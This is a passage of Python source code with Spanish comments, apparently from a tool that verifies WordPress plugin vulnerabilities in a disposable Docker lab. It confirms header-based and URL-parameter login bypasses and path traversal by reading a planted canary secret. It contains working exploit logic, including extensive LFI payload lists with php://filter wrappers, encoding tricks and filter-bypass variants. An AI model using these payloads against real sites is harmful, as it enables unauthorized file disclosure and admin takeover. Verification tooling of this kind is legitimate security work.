    "path": "...", "status": "success"}) -- hay que pedir esa URL aparte para ver el secreto
    plantado de verdad.

    Dos formas reconocidas: JSON con una clave 'url'/'file_url'/'link' (el caso confirmado en
    vivo), o HTML con un <img src=...>/<a href=...> apuntando a donde quedo la copia (una pagina
    de confirmacion en vez de JSON). Devuelve una LISTA (puede tener varias candidatas en el caso
    HTML, una pagina normal trae muchos src/href de CSS/JS/iconos que no tienen nada que ver) --
    se prueban EN ORDEN hasta encontrar el secreto, igual que ya se prueban en orden las distintas
    profundidades de '../', en vez de asumir que la primera coincidencia es la correcta."""
    try:
        data = json.loads(text or "")
    except Exception:
        data = None
    if isinstance(data, dict):
        urls = []
        for key in ("url", "file_url", "link"):
            v = data.get(key)
            if isinstance(v, str) and v.startswith(("http://", "https://")):
                urls.append(v)
        return urls
    if not text:
        return []
    from urllib.parse import urljoin
    candidates = []
    for m in _HTML_FOLLOWABLE_RE.finditer(text):
        href = m.group(1)
        if href.startswith(("http://", "https://")):
            candidates.append(href)
        elif base_url and href.startswith("/"):
            candidates.append(urljoin(base_url, href))
    # tope prudente: una pagina HTML normal trae decenas de src/href -- sin esto, seguir cada
    # enlace de la pagina por cada intento de payload dispararia cientos de peticiones extra.
    return candidates[:10]


def verify_wordpress_header_auth_bypass(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    custom_headers: dict, target_user_id: int = 1,
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
) -> "WpVerifyResult":
    """Verifica auth bypass via cabecera HTTP personalizada (p.ej. CVE-2023-28121 WooCommerce
    Payments: cabecera X-Wcpay-Platform-Checkout-User: 1 autentica como admin sin credenciales).

    Envia una peticion SIN cookies de sesion pero CON las custom_headers, al endpoint REST
    /wp-json/wp/v2/users/me (que normalmente exige autenticacion). Si la respuesta contiene
    datos del usuario objetivo (ID y/o email del admin creado en el lab), la bypass esta
    confirmada -- sin el mecanismo vulnerable, ese endpoint retornaria 401.

    target_user_id: el ID del usuario a suplantar (por defecto 1 = admin creado en el lab).
    """
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    if not custom_headers or not isinstance(custom_headers, dict):
        res.detail = "no hay cabeceras personalizadas que inyectar"
        res.limitations.append("verify_wordpress_header_auth_bypass necesita al menos una "
                               "cabecera en custom_headers (p.ej. {'X-User-Id': '1'})")
        return res

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        import requests as _req_hab
        base = boot.base_url.rstrip("/")
        anon_sess = _req_hab.Session()
        anon_sess.verify = False

        # Sustituir el marcador numerico en los valores de las cabeceras por el ID real del admin.
        actual_headers: dict = {}
        for hname, hval in custom_headers.items():
            hval_str = str(hval)
            # Si el valor es '1' o 'USER_ID' o '<user_id>', sustituir por el id real del lab.
            if hval_str in ("1", "USER_ID", "<user_id>", "{user_id}", "{USER_ID}"):
                hval_str = str(target_user_id)
            actual_headers[hname] = hval_str

        step(f"probando bypass via cabecera HTTP {list(actual_headers.keys())[0]}={list(actual_headers.values())[0]} "
             f"(sin sesion, endpoint /wp-json/wp/v2/users/me)...")

        try:
            r = anon_sess.get(f"{base}/wp-json/wp/v2/users/me",
                              headers=actual_headers, timeout=20)
            body = r.text[:2000]
            # Verificacion: la respuesta debe contener el ID del usuario objetivo
            # o su email (binoracle_admin@binoracle.test es el email del admin del lab)
            confirmed = False
            detail_evidence = ""
            if r.status_code == 200:
                try:
                    jdata = r.json()
                    if jdata.get("id") == target_user_id:
                        confirmed = True
                        detail_evidence = (f"ID={jdata.get('id')} roles={jdata.get('roles')} "
                                           f"name={jdata.get('name')}")
                    elif str(target_user_id) in body:
                        confirmed = True
                        detail_evidence = f"ID del usuario objetivo ({target_user_id}) en respuesta"
                except Exception:
                    if str(target_user_id) in body or "administrator" in body.lower():
                        confirmed = True
                        detail_evidence = "datos de admin en respuesta"
            elif r.status_code != 401:
                # Cualquier respuesta que no sea 401 con las cabeceras sugiere que algo pasa
                step(f"respuesta inusual: HTTP {r.status_code} (esperado 401 sin bypass)")

            if confirmed:
                res.verified = True
                res.poc_http = (f"{list(actual_headers.keys())[0]}: {list(actual_headers.values())[0]}\n"
                                f"GET /wp-json/wp/v2/users/me")
                res.detail = (f"bypass via cabecera HTTP confirmado: "
                              f"{list(actual_headers.keys())[0]}={list(actual_headers.values())[0]} "
                              f"→ {detail_evidence}")
                res.cvss_impact = "auth-bypass unauthenticated"
                step(f"VERIFICADO: {res.detail}")
                _hdr_name = list(actual_headers.keys())[0]
                _hdr_val = list(actual_headers.values())[0]
                _capture_exploit_shot(
                    boot, "GET", "/wp-json/wp/v2/users/me", r, highlight=str(target_user_id),
                    caption_es=(f"Paso 5 (CLAVE): HEADER AUTH BYPASS CONFIRMADO — "
                                f"{_hdr_name}: {_hdr_val} → {detail_evidence}. "
                                f"Sin sesion ni credenciales."),
                    caption_en=(f"Step 5 (KEY): HEADER AUTH BYPASS CONFIRMED — "
                                f"{_hdr_name}: {_hdr_val} → {detail_evidence}. No session needed."))
            else:
                step(f"bypass no confirmado via /wp-json/wp/v2/users/me (HTTP {r.status_code})")
                # Intentar con otros endpoints comunes
                for path in ["/wp-admin/profile.php", "/wp-json/wp/v2/users/1"]:
                    r2 = anon_sess.get(f"{base}{path}", headers=actual_headers,
                                       timeout=15, allow_redirects=True)
                    if r2.status_code == 200 and (
                            str(target_user_id) in r2.text
                            or "administrator" in r2.text.lower()
                            or "admin" in r2.text.lower()):
                        res.verified = True
                        res.poc_http = (f"{list(actual_headers.keys())[0]}: "
                                        f"{list(actual_headers.values())[0]}\nGET {path}")
                        res.detail = (f"bypass via cabecera HTTP confirmado en {path}: "
                                      f"respuesta de admin detectada sin sesion previa")
                        step(f"VERIFICADO en {path}: {res.detail}")
                        break
                if not res.verified:
                    res.detail = (f"bypass no confirmado: /wp-json/wp/v2/users/me devolvio "
                                  f"HTTP {r.status_code} con la cabecera especial "
                                  f"({list(actual_headers.keys())[0]}={list(actual_headers.values())[0]})")
                    res.limitations.append("si el plugin requiere que otro hook habilite el "
                                           "bypass (p.ej. add_filter registrado solo en "
                                           "ciertas peticiones), puede que sea necesario "
                                           "probar el endpoint real del plugin en lugar de "
                                           "/wp-json/wp/v2/users/me")
        except _req_hab.RequestException as exc:
            res.detail = f"error de red probando header auth bypass: {exc}"
        if boot is not None:
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
        return res
    finally:
        if not (keep_lab_on_failure and not res.verified):
            step("desmontando el laboratorio (contenedores/red/volumen)...")
            lab.teardown()


_URL_LOGIN_HINTS = (
    "wht_login", "ota_login", "auto_login", "bypass_login", "login_bypass",
    "token_login", "login_token", "pc_login", "pc_bypass", "access_token",
    "watchtower_token", "ota_token",
)


def verify_wordpress_url_param_login(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, login_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
) -> WpVerifyResult:
    """Verifica auth bypass via parametro URL que dispara un login automatico como admin.

    Patron: GET /?login_trigger=1 (sin credenciales) → el plugin autentica al atacante como admin.
    La prueba: tras la peticion al endpoint de bypass, la sesion contiene cookie wordpress_logged_in_*,
    y una peticion a /wp-json/wp/v2/users/me con esa cookie devuelve datos del admin del lab."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    login_p = login_param_hint or _pick_param(parameters, _URL_LOGIN_HINTS)
    if not login_p:
        _params_list = list(parameters.keys() if isinstance(parameters, dict) else (parameters or []))
        login_p = _params_list[0] if _params_list else ""
    if not login_p:
        res.detail = "no se identifico el parametro que dispara el login automatico"
        res.limitations.append(
            "verify_wordpress_url_param_login necesita un parametro de disparo "
            "(p.ej. wht_login); afina 'parameters' o pasa login_param_hint")
        return res

    lab = _Lab(_token())
    boot = None
    try:
        boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                              companion_plugins=companion_plugins,
                              shortcode_name=shortcode_name)
        if boot is None:
            return res

        base = boot.base_url.rstrip("/")
        ep = endpoint or "/"
        import requests as _req_wpl
        sess = _req_wpl.Session()
        sess.verify = False

        _params_dict = parameters if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        # Intentar con valor "1" y luego con el valor del hipotesis si existe
        _login_vals = ["1", _params_dict.get(login_p, "1"), "true", ""]
        _login_vals = list(dict.fromkeys(str(v) for v in _login_vals))  # deduplicate

        confirmed = False
        confirmed_detail = ""
        confirmed_cookie = ""
        for lval in _login_vals:
            try:
                _req_params = dict(_params_dict)
                _req_params[login_p] = lval
                r = sess.get(f"{base}{ep}", params=_req_params, timeout=25,
                             allow_redirects=True)
                _wp_cookie = next((c.name for c in sess.cookies
                                   if c.name.startswith("wordpress_logged_in_")), None)
                step(f"GET {ep}?{login_p}={lval!r} → HTTP {r.status_code}, "
                     f"cookie wp_logged_in={'si' if _wp_cookie else 'no'}")
                if _wp_cookie:
                    # Estrategia 1: REST API /users/me (necesita nonce en WP5+)
                    _confirmed_detail_local = ""
                    r2 = sess.get(f"{base}/wp-json/wp/v2/users/me", timeout=15)
                    if r2.status_code == 200:
                        try:
                            jdata = r2.json()
                            if isinstance(jdata.get("roles"), list) and "administrator" in jdata["roles"]:
                                _confirmed_detail_local = (f"login bypass confirmado: GET {ep}?{login_p}={lval} "
                                                    f"→ sesion admin via REST API (id={jdata.get('id')}, "
                                                    f"roles={jdata.get('roles')})")
                            elif jdata.get("id"):
                                _confirmed_detail_local = (f"login bypass confirmado: sesion de usuario "
                                                    f"id={jdata.get('id')} roles={jdata.get('roles')}")
                        except Exception:
                            if "administrator" in r2.text.lower() or "admin" in r2.text[:300].lower():
                                _confirmed_detail_local = (f"login bypass: sesion con cookie {_wp_cookie}, "
                                                    f"respuesta de /users/me contiene 'admin'")
                    # Estrategia 2: acceder a /wp-admin/ (sin redirect a login = acceso real de admin)
                    if not _confirmed_detail_local:
                        r3 = sess.get(f"{base}/wp-admin/", timeout=15, allow_redirects=True)
                        step(f"  /wp-admin/ → HTTP {r3.status_code}, "
                             f"login_redirect={'si' if 'wp-login' in r3.url else 'no'}")
                        if r3.status_code == 200 and "wp-login" not in r3.url:
                            # Comprobar que es una pagina de admin real (no pagina de login disfrazada)
                            if any(k in r3.text for k in
                                   ("wp-admin/js/", "adminmenu", "wpadminbar", "#wpbody", "Dashboard")):
                                _confirmed_detail_local = (
                                    f"login bypass confirmado: GET {ep}?{login_p}={lval} "
                                    f"→ acceso directo a /wp-admin/ con cookie {_wp_cookie}")
                    if _confirmed_detail_local:
                        confirmed = True
                        confirmed_detail = _confirmed_detail_local
                        confirmed_cookie = _wp_cookie
                    if confirmed:
                        break
            except _req_wpl.RequestException as exc:
                step(f"error en peticion de bypass: {exc}")

        if confirmed:
            res.verified = True
            res.detail = confirmed_detail
            res.cvss_impact = "auth-bypass unauthenticated administrator"
            res.evidence = {
                "login_param": login_p,
                "login_val": lval,
                "endpoint": ep,
                "cookie": confirmed_cookie,
                "metodo": "GET",
                "tecnica": "url-param-login-bypass",
                "detail": confirmed_detail,
            }
            step(f"VERIFICADO: {confirmed_detail}")
            _capture_exploit_shot(
                boot, "GET", f"{ep}?{login_p}={lval}", r,
                highlight=confirmed_cookie,
                caption_es=(f"URL PARAM LOGIN BYPASS: GET {ep}?{login_p}={lval} "
                             f"→ sesion admin sin credenciales ({confirmed_cookie})"),
                caption_en=(f"URL PARAM LOGIN BYPASS: GET {ep}?{login_p}={lval} "
                             f"→ admin session with no credentials ({confirmed_cookie})"))
        else:
            res.detail = (f"bypass no confirmado: GET {ep}?{login_p}=1 no establece sesion admin. "
                          f"Puede que el plugin requiera token OTA configurado, o no sea vulnerable "
                          f"a esta firma concreta.")
            res.limitations.append(
                "url-param-login fallido: el parametro encontrado no disparo una sesion de admin; "
                "comprueba si el token OTA ya esta configurado (no vacio) en la instalacion lab")
        if boot is not None:
            res.evidence["screenshots"] = boot.shots
            res.evidence["http_captures"] = boot.http_captures
        return res
    finally:
        if not (keep_lab_on_failure and not res.verified):
            step("desmontando el laboratorio (contenedores/red/volumen)...")
            lab.teardown()


def _lfi_payloads(target_file: str, depths=(2, 4, 6, 8, 10, 12)) -> list:
    """Return extra LFI payload variants for target_file beyond the standard '../' set.

    Covers: PHP stream wrappers (php://filter), UTF-8 overlong encoding, mixed
    slash/backslash, Windows device path, and triple-dot bypass.
    These run after the standard encoding variants to avoid redundancy.
    """
    rel = target_file.lstrip("/")
    payloads = []

    # php://filter: bypasses include() extension appending and reads raw bytes as base64
    payloads += [
        f"php://filter/convert.base64-encode/resource={target_file}",
        f"php://filter/read=convert.base64-encode/resource={target_file}",
        f"php://filter/zlib.inflate/convert.base64-encode/resource={target_file}",
    ]

    # UTF-8 overlong encoding for '/' (%c0%af) and '.' (%c0%ae) — bypasses regex that
    # only decodes ASCII before filtering (older PHP + libapache mod_rewrite combos)
    overlong_slash = "%c0%af"
    payloads += [
        (overlong_slash.join([".."] * n) + overlong_slash + rel)
        for n in depths
    ]

    # Mixed separators: forward + backslash alternating — trips up naive str_replace
    payloads += [
        ("../" * n).replace("/", "\\", (n // 2)) + rel
        for n in depths if n >= 2
    ]

    # Triple-dot variant: some filters strip '..' → '..' leaving '.' (single dot = no-op)
    # but '...' minus one '.' leaves '..' — bypasses exact-match filters on '..'
    payloads += [
        (".../" * n) + rel for n in depths
    ]

    # Windows device path: \\\\server\\share\\... triggers UNC fetch on Windows targets
    payloads += [
        "\\\\" + ("..\\\\".join([""] * (n + 1))) + target_file.replace("/", "\\")
        for n in [2, 4]
    ]

    return payloads


def verify_wordpress_path_traversal(
    plugin_source_dir: str, slug: str, endpoint: str, http_method: str,
    parameters, path_param_hint: str = "",
    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
    companion_plugins: Optional[list] = None,
    extra_nonce_pages: Optional[list] = None,
    extra_setup_trigger_paths: Optional[list] = None,
    shortcode_name: Optional[str] = None,
    keep_lab_on_failure: bool = False,
    _tried_params_set: Optional[frozenset] = None,
    _live_boot: Optional["_LabSession"] = None,
) -> WpVerifyResult:
    """Verifica path-traversal/LFI: planta un fichero CANARIO con un secreto aleatorio en una ruta
    del sistema de ficheros REAL del contenedor Apache (fuera del volumen /var/www/html, via
    `docker exec` directo -- ver _Lab.write_canary), y confirma que, al pedir esa ruta a traves del
    parametro de fichero/ruta que la hipotesis cita, la respuesta del endpoint devuelve el secreto
    EXACTO. Esto es prueba inequivoca (un secreto de 32 caracteres aleatorios no puede aparecer por
    casualidad), no una deduccion por status code o por el tamano de la respuesta.

    Se prueban varias profundidades de '../' por delante de la ruta absoluta del canario (sin
    saber de antemano cuantos niveles hay entre el directorio base del plugin y la raiz web), ya
    que no se puede leer el codigo para saberlo con certeza en todos los casos; cada intento es una
    peticion real, independiente, registrada en la evidencia. Siempre desmonta el laboratorio."""
    step = on_step or (lambda _m: None)
    pre = _check_prereqs(plugin_source_dir, slug)
    if pre is not None:
        return pre
    res = WpVerifyResult()
    t0 = time.time()

    path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
    if not path_param:
        # fallback: primer param que no sea WP infra (action/nonce/security/_wpnonce) — cubre
        # plugins LFI cuyo param no está en _PATH_HINTS (ej. sogrid 'file', wp-umbrella 'path',
        # chartify 'source'). Sin filtrar infra, 'action' sería elegido antes que 'source'.
        _WP_INFRA_PARAMS_PT = frozenset({"action", "nonce", "security", "_wpnonce", "_nonce",
                                         "wp_nonce", "ajax_nonce", "verify", "token"})
        _params_list = list(parameters.keys() if isinstance(parameters, dict) else (parameters or []))
        _non_infra = [p for p in _params_list if p.lower() not in _WP_INFRA_PARAMS_PT]
        if _non_infra:
            path_param = _non_infra[0]
        elif _params_list:
            path_param = _params_list[0]
        # Last resort: static analysis of PHP source for file-read sinks
        if not path_param and plugin_source_dir:
            path_param = _detect_lfi_param_from_source(plugin_source_dir) or ""
        if not path_param:
            res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
            res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
                                   "lleva la ruta/nombre de fichero; afina 'parameters' en la "
                                   "hipotesis del LLM o pasalo a mano (path_param_hint)")
            return res

    lab = _Lab(_token())
    boot = None
    _owns_boot = _live_boot is None
    try:
        if _live_boot is not None:
            boot = _live_boot
        else:
            boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
                                  companion_plugins=companion_plugins,
                                  extra_setup_trigger_paths=extra_setup_trigger_paths,
                                  shortcode_name=shortcode_name)
            if boot is None:
                return res

        secret = secrets.token_hex(16)
        canary_path = f"/tmp/binoracle_canary_{_token()}.txt"
        step(f"plantando fichero canario con un secreto aleatorio en {canary_path} (dentro del "
             f"propio contenedor, fuera del volumen web)...")
        if not boot.lab.write_canary(canary_path, secret):
            res.detail = f"no se pudo plantar el fichero canario en {canary_path}"
            return res
        # PHP canary para LFI que hace require_once/include con sufijo '.php' hardcoded
        # (ej. require_once __DIR__.'/tabs/'.$tab.'.php') -- el canario de texto no funciona
        # porque PHP convierte '/tmp/HASH.txt' en '/tmp/HASH.txt.php' (inexistente).
        # Solución: escribir un .php que ejecute echo; usar paths SIN extension para que PHP añada .php.
        php_secret = secrets.token_hex(16)
        php_canary_token = _token()
        php_canary_path = f"/tmp/binoracle_canary_{php_canary_token}.php"
        _php_canary_ok = boot.lab.write_canary(php_canary_path,
                                                f"<?php echo '{php_secret}'; ?>")
        if not _php_canary_ok:
            php_secret = ""  # skip php attempts if write failed
            php_canary_path = ""

        m = (http_method or "GET").upper()
        base_params = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
        # Normalizar endpoint: si el PoC incluye el param en la query string del propio endpoint
        # (ej. '?tab=FILEHERE'), extraerlo para evitar doble '?tab=FILEHERE&tab=payload'.
        # PHP usa el ultimo valor de un param duplicado, pero es mejor enviarlo una sola vez.
        if "?" in (endpoint or ""):
            from urllib.parse import urlparse, parse_qs
            _ep_parsed = urlparse(endpoint)
            _ep_qs_params = parse_qs(_ep_parsed.query, keep_blank_values=True)
            # Separar params del endpoint: distinguir placeholders de valores reales.
            # - Placeholder (FILEHERE, INJECT...): extraer como "" para que el verifier inyecte
            # - Valor real (action=add, umbrella-restore=1, page=logs): extraer con su valor real
            # - Valor con path traversal (../../etc/passwd): extraer como "" (el payload irá aquí)
            _WORD_PLACEHOLDER_RE = re.compile(r'^[A-Z_]+(?:HERE|THERE|PAYLOAD|INJECT|PLACEHOLDER)$')
            _TRAVERSAL_RE = re.compile(r'\.\.[\\/]|%2e%2e|%252e')
            for _qk, _qv in _ep_qs_params.items():
                _orig_v = _qv[0] if _qv else ""
                _vl_up = _orig_v.upper()
                _is_word_placeholder = (_WORD_PLACEHOLDER_RE.match(_vl_up) or
                                        _vl_up in {"FILEHERE", "PAYLOAD", "INJECT", ""})
                _is_traversal_payload = bool(_TRAVERSAL_RE.search(_orig_v))
                if _qk not in base_params:
                    if _is_word_placeholder or _is_traversal_payload:
                        base_params[_qk] = ""  # slot para que el verifier inyecte
                    else:
                        base_params[_qk] = _orig_v  # valor real, preservar
            endpoint = _ep_parsed.path
        # Si path_param (de hint o _PATH_HINTS) no existe en base_params (ej. hint="file" pero el
        # endpoint QS tiene "tab=FILEHERE"), sobreescribirlo con el primer param placeholder de
        # base_params — ese viene de la QS real del PoC y es el nombre correcto del parametro.
        if path_param not in base_params:
            _qs_placeholders = [k for k, v in base_params.items() if v == ""]
            if _qs_placeholders:
                _old_pp = path_param
                path_param = _qs_placeholders[0]
                step(f"path_param ajustado: '{_old_pp}' no esta en base_params -- "
                     f"usando '{path_param}' (extraido de la QS del endpoint)")
        # Fix 19: si endpoint es fichero PHP directo del plugin (wp-content/plugins/...)
        # fuera de WordPress, buscamos la ruta admin real via add_menu_page en el codigo.
        # Razon: los ficheros PHP del plugin usan funciones WordPress (esc_html, __(), etc.)
        # que no estan disponibles en acceso HTTP directo -- PHP lanza Fatal Error y la
        # respuesta esta vacia, haciendo imposible confirmar el LFI.
        _ep_norm_lc = (endpoint or "").lstrip("/").lower()
        if ("wp-content/plugins/" in _ep_norm_lc and
                "wp-admin" not in _ep_norm_lc and
                "wp-json" not in _ep_norm_lc and
                plugin_source_dir and
                os.path.isdir(plugin_source_dir)):
            import re as _re_menu19
            _grep19 = subprocess.run(
                ["grep", "-rh", "add_menu_page", plugin_source_dir,
                 "--include=*.php", "-A4", "-m5"],
                capture_output=True, text=True, timeout=10)
            _slug19_m = _re_menu19.search(
                r"add_menu_page\s*\([^,]+,[^,]+,[^,]+,\s*['\"]([^'\"]+)['\"]",
                _grep19.stdout or "")
            if _slug19_m:
                _admin_slug19 = _slug19_m.group(1)
                base_params["page"] = _admin_slug19
                endpoint = "/wp-admin/admin.php"
                step(f"endpoint es fichero PHP directo del plugin; acceso directo falla sin "
                     f"WordPress (funciones WP no disponibles) -- redirigiendo a "
                     f"/wp-admin/admin.php?page={_admin_slug19}")
        # mismos bloqueos de infraestructura que SQLi (nonce/token sin resolver, ID ofuscado) --
        # ver _auto_resolve_wp_blockers: cualquier tecnica contra WordPress puede necesitarlo, no
        # solo SQLi.
        endpoint, base_params = _auto_resolve_wp_blockers(
            boot, lab, slug, m, endpoint, base_params, path_param, res, step,
            extra_nonce_pages=extra_nonce_pages)

        # auto-seleccionar sesion correcta: endpoints bajo /wp-admin/ necesitan admin
        _ep_lower_pt = (endpoint or "").lower()
        _pt_needs_admin = ("/wp-admin/" in _ep_lower_pt or
                           "admin-ajax.php" in _ep_lower_pt or
                           _ep_lower_pt.startswith("wp-admin/"))
        _pt_sess = boot.admin_sess if (_pt_needs_admin and boot.admin_sess) else boot.sub_sess
        if _pt_needs_admin and boot.admin_sess:
            step("endpoint bajo /wp-admin/ -- usando sesion de admin para path-traversal")

        res.evidence.update({
            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
            "path_param": path_param, "canary_path": canary_path, "canary_secret": secret,
            "metodo": m, "endpoint": endpoint,
        })

        # varias profundidades de '../': el payload real depende de donde concatena el codigo el
        # parametro, que no podemos saber con certeza sin leer el codigo -- cada intento es una
        # peticion real, no una suposicion que se cuela como si fuera un hecho confirmado.
        rel = canary_path.lstrip("/")
        depths = (2, 4, 6, 8, 10, 12)

        # Detectar si el path_param original es un JSON array codificado en base64
        # (ej. CVE-2024-10516 Swift Performance: data=base64(["template-part","null","PATH"]))
        # Si lo es, envolver cada payload en la misma estructura base64-JSON.
        import base64 as _b64, json as _json
        _b64_json_template: list | None = None
        _b64_json_path_idx: int = -1
        _orig_path_val = base_params.get(path_param, "")
        if isinstance(_orig_path_val, str) and _orig_path_val:
            try:
                _decoded = _b64.b64decode(_orig_path_val + "==").decode("utf-8", errors="strict")
                _parsed = _json.loads(_decoded)
                if isinstance(_parsed, list) and len(_parsed) >= 2:
                    # Buscar el elemento que parece una ruta (contiene '/' o '..')
                    for _pi, _pv in enumerate(_parsed):
                        if isinstance(_pv, str) and (".." in _pv or "/" in _pv):
                            _b64_json_template = list(_parsed)
                            _b64_json_path_idx = _pi
                            break
            except Exception:
                pass

        def _wrap_path(p: str) -> str:
            if _b64_json_template is not None:
                _t = list(_b64_json_template)
                _t[_b64_json_path_idx] = p
                return _b64.b64encode(_json.dumps(_t, separators=(",", ":")).encode()).decode()
            return p

        if _b64_json_template is not None:
            step(f"[LFI] path_param='{path_param}' contiene JSON base64 (idx {_b64_json_path_idx}): "
                 f"cada payload sera codificado como base64(JSON)")

        attempts = [_wrap_path(p) for p in [rel, canary_path]]
        attempts += [_wrap_path(("../" * n) + rel) for n in depths]
        # variantes de codificacion/filtro (cada una ataca un saneo distinto que un codigo real
        # podria aplicar -- str_replace('../','') naive, basename() que no toca %2e, un WAF que
        # decodifica una sola vez, Windows que acepta backslash, o el null-byte historico de PHP
        # <5.3.4 que trunca la extension que el codigo pudiera anadir):
        attempts += [_wrap_path(("..%2f" * n) + rel) for n in depths]                      # URL-encoded
        attempts += [_wrap_path(("%2e%2e%2f" * n) + rel) for n in depths]                  # fully encoded
        attempts += [_wrap_path(("%252e%252e%252f" * n) + rel) for n in depths]            # double-encoded
        attempts += [_wrap_path(("..\\" * n) + rel) for n in depths]                       # backslash (Windows)
        attempts += [_wrap_path(("....//" * n) + rel) for n in depths]                     # bypass str_replace('../','')
        attempts += [_wrap_path(rel + "%00"), _wrap_path(canary_path + "%00")]             # null-byte legacy
        # PHP stream wrappers + overlong/triple-dot from _lfi_payloads() — these run after
        # the basic set so early detection (canary hit) avoids sending the extra requests.
        attempts += [_wrap_path(p) for p in _lfi_payloads(canary_path, depths)]
        # PHP-canary attempts: para LFI donde el codigo hace include/require_once con .php hardcoded
        # (ej. require_once __DIR__.'/tabs/'.$tab.'.php') -- el .txt canary no funciona porque PHP
        # lo convierte en .txt.php (inexistente). La solucion: usar paths SIN extension para que PHP
        # aņada .php y ejecute el canario PHP; cualquier secreto (txt o php) detectado = exito.
        _all_secrets = {secret}
        if php_secret and _php_canary_ok:
            php_rel = php_canary_path[:-4].lstrip("/")  # "tmp/binoracle_canary_TOKEN" sin .php
            _all_secrets.add(php_secret)
            attempts += [_wrap_path(p) for p in [php_rel, php_canary_path[:-4]]]
            attempts += [_wrap_path(("../" * n) + php_rel) for n in depths]
            attempts += [_wrap_path(("..%2f" * n) + php_rel) for n in depths]
            attempts += [_wrap_path(("....//" * n) + php_rel) for n in depths]
        found = False
        tried = []
        for payload_value in attempts:
            payload = dict(base_params)
            payload[path_param] = payload_value
            step(f"probando {m} {endpoint} con {path_param}={payload_value!r}...")
            try:
                resp = _pt_sess.request(m, boot.base_url + endpoint,
                                   data=payload if m != "GET" else None,
                                   params=payload if m == "GET" else None, timeout=20)
            except Exception as e:
                tried.append({"payload": payload_value, "error": str(e)})
                continue
            # un recorte corto del cuerpo real (NO solo si/no hay secreto) en CADA intento --
            # confirmado en vivo, CVE-2024-50508: sin esto, un negativo (file_exists()/copy()
            # fallando por permisos, un error de la propia app...) no se puede diagnosticar sin
            # volver a lanzar el ataque a mano o leer el codigo del plugin; con el cuerpo real
            # delante (p.ej. '{"status":"error","message":"File is not moved..."}') se ve al
            # momento si el servidor esta rechazando el intento y por que, en vez de tener que
            # adivinarlo desde fuera.
            _resp_text = resp.text or ""
            _hit_secret = next((s for s in _all_secrets if s in _resp_text), None)
            # Base64 detection: some plugins return file contents base64-encoded in a JSON field.
            # Decode any base64-looking values in the response and check for the secret there.
            if not _hit_secret and _resp_text:
                import base64 as _b64_pt
                import re as _re_pt
                for _b64_cand in _re_pt.findall(r'[A-Za-z0-9+/]{24,}={0,2}', _resp_text):
                    try:
                        _decoded = _b64_pt.b64decode(_b64_cand + '==').decode('utf-8', errors='ignore')
                        _b64_hit = next((s for s in _all_secrets if s in _decoded), None)
                        if _b64_hit:
                            _hit_secret = _b64_hit
                            step(f"  secreto encontrado en contenido base64 decodificado "
                                 f"(candidato: {_b64_cand[:20]}...)")
                            break
                    except Exception:
                        continue
            tried.append({"payload": payload_value, "status": resp.status_code,
                          "secret_presente": bool(_hit_secret),
                          "respuesta_cuerpo_recorte": _resp_text[:300]})
            # patron "copia-y-sirve" (ver _extract_followable_urls): algunos endpoints no
            # reflejan el contenido en ESTA respuesta, copian el fichero a una ruta publica
            # nueva y devuelven DONDE quedo -- hay que pedirla aparte para ver el secreto real.
            # Se prueban todas las candidatas EN ORDEN hasta encontrar el secreto (una pagina
            # HTML normal puede traer varios src/href que no tienen nada que ver).
            followed_resp, follow_url = resp, None
            if not _hit_secret:
                for candidate in _extract_followable_urls(_resp_text, boot.base_url):
                    try:
                        candidate_resp = _pt_sess.request("GET", candidate, timeout=20)
                    except Exception as e:
                        tried[-1].setdefault("followed_url_errors", []).append(
                            {"url": candidate, "error": str(e)})
                        continue
                    _candidate_hit = next((s for s in _all_secrets if s in (candidate_resp.text or "")), None)
                    if _candidate_hit:
                        _hit_secret = _candidate_hit
                        followed_resp, follow_url = candidate_resp, candidate
                        break
                if follow_url:
                    tried[-1]["followed_url"] = follow_url
                tried[-1]["followed_secret_presente"] = bool(
                    next((s for s in _all_secrets if s in (followed_resp.text or "")), None))
            if _hit_secret and _hit_secret in (followed_resp.text or ""):
                found = True
                res.evidence["payload_ganador"] = payload_value
                if follow_url:
                    res.evidence["url_seguida"] = follow_url
                res.evidence["status_code_respuesta"] = followed_resp.status_code
                res.evidence["respuesta_cuerpo_recorte"] = (followed_resp.text or "")[:500]
                step((f"VERIFICADO: el secreto plantado aparecio literal en la respuesta de "
                     f"{follow_url} (la peticion original copio el fichero ahi en vez de "
                     f"devolver el contenido directo)" if follow_url else
                     f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
                     f"{path_param}={payload_value!r}."))
                # Captura HTTP del exploit (GET, POST y redirect)
                _winning_resp = followed_resp
                _capture_exploit_shot(
                    boot, m, endpoint, _winning_resp, highlight=_hit_secret,
                    caption_es=(f"Paso 5 (CLAVE): PATH TRAVERSAL CONFIRMADO — respuesta HTTP "
                                f"con el secreto plantado en {canary_path} filtrado. "
                                f"Payload: {path_param}={payload_value!r}"),
                    caption_en=(f"Step 5 (KEY): PATH TRAVERSAL CONFIRMED — HTTP response "
                                f"with secret from {canary_path} leaked. "
